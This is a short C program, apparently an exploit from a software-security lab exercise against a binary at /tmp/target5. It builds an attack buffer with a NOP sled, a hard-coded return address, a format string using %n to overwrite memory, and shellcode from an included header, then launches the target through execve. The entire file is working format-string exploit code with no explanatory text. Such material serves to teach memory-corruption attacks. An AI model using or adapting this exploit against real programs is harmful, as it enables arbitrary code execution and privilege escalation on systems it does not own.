#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target5"

int main(void)
{
  char *args[3];
  char *env[1];
  
  char buf[480];
  int i;
  char *formatstring = "%2.0f%12582442u%n";

  // Fill buf with NOPS
  for (i = 0; i < 480; i++) {
      buf[i] = '\x90';
  }

  // Setting EIP + 1 (skips last bit of EIP)
  buf[0] = '\x9d';
  buf[1] = '\xfc';
  buf[2] = '\xff';
  buf[3] = '\xbf';


  // Format String Exploit
  for (i = 0; i < strlen(formatstring); i++) {
    buf[i+479-strlen(formatstring)] = formatstring[i];
  }

  // Setting shellcode
  for (i=0; i<strlen(shellcode); i++) {
    buf[i+479-strlen(formatstring)-strlen(shellcode)] = shellcode[i];
  }

  // Null character to stop
  buf[479] = '\0';
  
 
  args[0] = TARGET; args[1] = buf; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
